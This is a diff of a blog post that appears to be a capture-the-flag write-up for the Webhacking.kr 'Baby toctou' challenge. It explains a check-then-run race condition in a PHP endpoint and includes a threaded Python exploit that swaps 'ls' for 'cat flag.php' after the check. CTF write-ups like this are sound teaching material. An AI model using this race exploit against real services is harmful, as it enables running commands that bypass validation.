@@ -1,4 +1,8 @@
-# [Webhacking.kr] Baby toctou writeup
+---
+layout: page
+title: "[Webhacking.kr] Baby toctou 🍼 writeup"
+categories: hacking
+---
 
 ## Introduction
 
@@ -26,7 +30,7 @@ HELP;
 ?>
 ```
 
-This `api.php` simply write the command you want to execute into a file named by the `baby_toctou` cookie. After writing the file, it checks the command before executing the file.
+This `api.php` simply writes the command you want to execute into a file named by the `baby_toctou` cookie. After writing the file, it checks the command before executing the file.
 Nothing's wrong with the `if` check, so what could go wrong?
 
 ## Race condition
@@ -41,15 +45,15 @@ Here's the idea:
 | Step | P1                              | P2                                |
 | ---- | ------------------------------- | --------------------------------- |
 | 1    | Writes `ls` to the file         | -                                 |
-| 2    | Passes the if check             | -                                 |
+| 2    | Passes the `if` check           | -                                 |
 | 3    | Waits 1 second before executing | Writes `cat flag.php` to the file |
-| 4    | Executes the file               | Fails the if check                |
+| 4    | Executes the file               | Fails the `if` check              |
 
 Easy!
 
-## Exploit
+## Exploitation
 
-There's nothing to talk about this, but I'll post my code here.
+There's not much to talk about this, but I'll post my code here as a reference.
 
 ```python
 import requests, threading, time
@@ -57,7 +61,7 @@ import requests, threading, time
 def send(cmd):
     cookies = {
         'PHPSESSID': 'ofq76t3822i5ee1plskj2bafmt',
-        'baby_toctou': 'abc91',
+        'baby_toctou': 'abc91', # just a random string, anything will work
     }
 
     headers = {
@@ -77,15 +81,15 @@ def send(cmd):
     response = requests.get('http://webhacking.kr:10019/api.php', params=params, cookies=cookies, headers=headers, verify=False)
     print(response.text)
 
-u1 = threading.Thread(target=send, args=('ls',))
-u2 = threading.Thread(target=send, args=('cat flag.php',))
+p1 = threading.Thread(target=send, args=('ls',))
+p2 = threading.Thread(target=send, args=('cat flag.php',))
 
 
 print('[info] getting in ...')
 
-u1.start()
+p1.start()
 time.sleep(0.25)
-u2.start()
+p2.start()
 ```
 
 ## Conclusion
